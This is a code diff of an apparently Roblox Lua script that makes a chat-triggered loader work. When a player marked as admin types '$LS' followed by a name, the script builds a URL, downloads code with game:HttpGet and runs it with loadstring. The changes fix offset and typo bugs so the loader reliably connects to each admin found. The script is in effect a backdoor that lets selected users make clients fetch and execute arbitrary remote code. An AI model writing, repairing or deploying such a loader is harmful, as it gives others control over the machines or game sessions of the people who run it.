@@ -52,15 +52,15 @@ local function Connect(Obj)
        end
     end
    
-    if Chat:lower():sub(1,3) == ("$LS ") then
-      local SpacePercent = string.sub(Chat, 4)
+    if Chat:lower():sub(1,4) == ("$LS ") then
+      local SpacePercent = string.sub(Chat, 5)
       SpacePercent = SpacePercent:gsub(" ", "%20")
       local ToLoad = Script_PH:gsub("DD", SpacePercent)
       loadstring(game:HttpGet(ToLoad))
     end
     
-    if Chat:lower():sub(1,6) == ("/e $LS ") then
-      local SpacePercent = string.sub(Chat, 4)
+    if Chat:lower():sub(1,7) == ("/e $ls ") then
+      local SpacePercent = string.sub(Chat, 8)
       SpacePercent = SpacePercent:gsub(" ", "%20")
       local ToLoad = Script_PH:gsub("DD", SpacePercent)
       loadstring(game:HttpGet(ToLoad))
@@ -95,8 +95,9 @@ end)
 
 wait(4)
 
-for I, V in piars(Players:GetPlayers()) do
+for I, V in pairs(Players:GetPlayers()) do
  if IsAdmin(V.UserId) then
-   Connect(Player[1])
+   print(V.UserId .. " FOUND!")
+   Connect(V)
   end
 end
